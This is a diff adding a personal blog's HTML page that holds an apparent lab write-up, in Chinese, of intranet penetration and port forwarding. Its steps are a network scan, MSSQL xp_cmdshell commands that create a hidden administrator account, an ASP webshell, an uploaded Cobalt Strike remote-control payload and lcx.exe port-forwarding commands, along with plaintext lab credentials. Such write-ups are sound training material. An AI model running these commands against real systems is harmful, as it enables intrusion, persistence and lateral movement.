@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+        <link rel="shortcut icon" href="/img/assets/0922.ico">
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>no title | niu&#39;s blog</title>
+
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="210903内网渗透:端口转发210903内网渗透:端口转发靶场地址 http:&#x2F;&#x2F;192.168.179.75&#x2F;1.asp 通过fscan扫描得到mssql账号秘密，Navicat链接登录数据库，whoami查看，当前权限为system，创建账号gd13$，密码admin@123，添加到administrator组，通过该账号远程登录，在www目录下写入一句话木马asp，打开kali蚁剑链接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="niu&#39;s blog">
+<meta property="og:url" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
+<meta property="og:site_name" content="niu&#39;s blog">
+<meta property="og:description" content="210903内网渗透:端口转发210903内网渗透:端口转发靶场地址 http:&#x2F;&#x2F;192.168.179.75&#x2F;1.asp 通过fscan扫描得到mssql账号秘密，Navicat链接登录数据库，whoami查看，当前权限为system，创建账号gd13$，密码admin@123，添加到administrator组，通过该账号远程登录，在www目录下写入一句话木马asp，打开kali蚁剑链接">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831191818764.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831192054560.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831194028029.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831202425448.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831202530309.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831202648860.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831203004613.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831203016345.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831204542590.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831203215306.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831205122155.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903204618071.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903204838431.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903205111769.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903205153499.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903205420939.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903210054589.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903210314507.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903210456317.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903211135544.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903211948437.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212024618.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212112116.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212704462.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212729352.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903222630836.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903223233650.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903225319610.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903225342838.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903230024732.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903230155364.png">
+<meta property="article:published_time" content="2021-09-04T03:07:30.751Z">
+<meta property="article:modified_time" content="2021-09-04T03:06:43.400Z">
+<meta property="article:author" content="Peter Niu">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://uruz24.github.io/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831191818764.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="/css/highlight/default.css" media="none" >
+        
+            <link rel="stylesheet" id="hl-dark-theme" href="/css/highlight/dark.css" media="none">
+        
+    
+
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <body>
+        <div id="app">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Niu&#39;s blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/friends/" class="navbar-menu button">友链</a>
+                
+                    <a href="/page/" class="navbar-menu button">Page</a>
+                
+            </div>
+        
+        
+        
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/friends/" class="dropdown-menu button">友链</a>
+                
+                    <a href="/page/" class="dropdown-menu button">Page</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        no title
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2021/09/" class="post-meta__date button">2021-09-04</a>
+        
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+
+<article class="post content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <hr>
+<h2 id="210903内网渗透-端口转发"><a href="#210903内网渗透-端口转发" class="headerlink" title="210903内网渗透:端口转发"></a>210903内网渗透:端口转发</h2><h2 id="210903内网渗透-端口转发-1"><a href="#210903内网渗透-端口转发-1" class="headerlink" title="210903内网渗透:端口转发"></a>210903内网渗透:端口转发</h2><p>靶场地址</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.179.75/1.asp">http://192.168.179.75/1.asp</a></p>
+<p>通过fscan扫描得到mssql账号秘密，Navicat链接登录数据库，whoami查看，当前权限为system，创建账号gd13$，密码admin@123，添加到administrator组，通过该账号远程登录，在www目录下写入一句话木马asp，打开kali蚁剑链接</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831191818764.png" alt="image-20210831191818764"></p>
+<p>fscan 扫描目标ip  </p>
+<p><code>/home/kali/cs4.2/tools/fscan_amd64 -h 192.168.179.75</code></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831192054560.png" alt="image-20210831192054560"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831194028029.png" alt="image-20210831194028029"></p>
+<p><code>exec(&#39;xp_cmdshell &quot;whoami&quot;&#39;)</code></p>
+<p>添加用户 gd13$  admin@123 </p>
+<p><code>exec(&#39;xp_cmdshell &quot;net user gd13$ admin@123 /add&quot;&#39;)</code></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831202425448.png" alt="image-20210831202425448"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831202530309.png" alt="image-20210831202530309"></p>
+<p><code>exec(&#39;xp_cmdshell &quot;net localgroup administrators gd13$ /add&quot;&#39;)</code></p>
+<p><code>exec(&#39;xp_cmdshell &quot;net localgroup administrators&quot;&#39;)</code></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831202648860.png" alt="image-20210831202648860"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831203004613.png" alt="image-20210831203004613"></p>
+<p>查看user表 里面有管理员账户名密码，虽然解密成功但是，禁止远程登录</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831203016345.png" alt="image-20210831203016345"></p>
+<p>admin     qwer1234!@#$</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831204542590.png" alt="image-20210831204542590"></p>
+<p>bao  bao123</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831203215306.png" alt="image-20210831203215306"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210831205122155.png" alt="image-20210831205122155"></p>
+<p>kali中打开cs 链接vps服务器</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903204618071.png" alt="image-20210903204618071"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903204838431.png" alt="image-20210903204838431"></p>
+<p>生成Windows版的远控程序</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903205111769.png" alt="image-20210903205111769"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903205153499.png" alt="image-20210903205153499"></p>
+<p>使用蚁剑上传远控程序</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903205420939.png" alt="image-20210903205420939"></p>
+<p>双击远控程序，在cs中查看</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903210054589.png" alt="image-20210903210054589"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903210314507.png" alt="image-20210903210314507"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903210456317.png" alt="image-20210903210456317"></p>
+<p><code>shell C:\www\lcx.exe -tran 3333 192.168.1.107 8080</code></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903211135544.png" alt="image-20210903211135544"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903211948437.png" alt="image-20210903211948437"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212024618.png" alt="image-20210903212024618"></p>
+<p>转发成功，访问75的3333端口，107的8080端口转发成功</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212112116.png" alt="image-20210903212112116"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212704462.png" alt="image-20210903212704462"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903212729352.png" alt="image-20210903212729352"></p>
+<p>use18</p>
+<p><code>shell C:\www\lcx.exe -tran 4444 192.168.22.187 4444</code></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903222630836.png" alt="image-20210903222630836"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903223233650.png" alt="image-20210903223233650"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903225319610.png" alt="image-20210903225319610"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903225342838.png" alt="image-20210903225342838"></p>
+<p>设置用户名和密码Tomcat</p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903230024732.png" alt="image-20210903230024732"></p>
+<p><img src="210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210903230155364.png" alt="image-20210903230155364"></p>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>updated at 2021-09-04</p></div> 
+    <div class="post-entry__tags"></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            no title
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2021 <a href="/">niu&#39;s blog</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+
+    </body>
+</html>
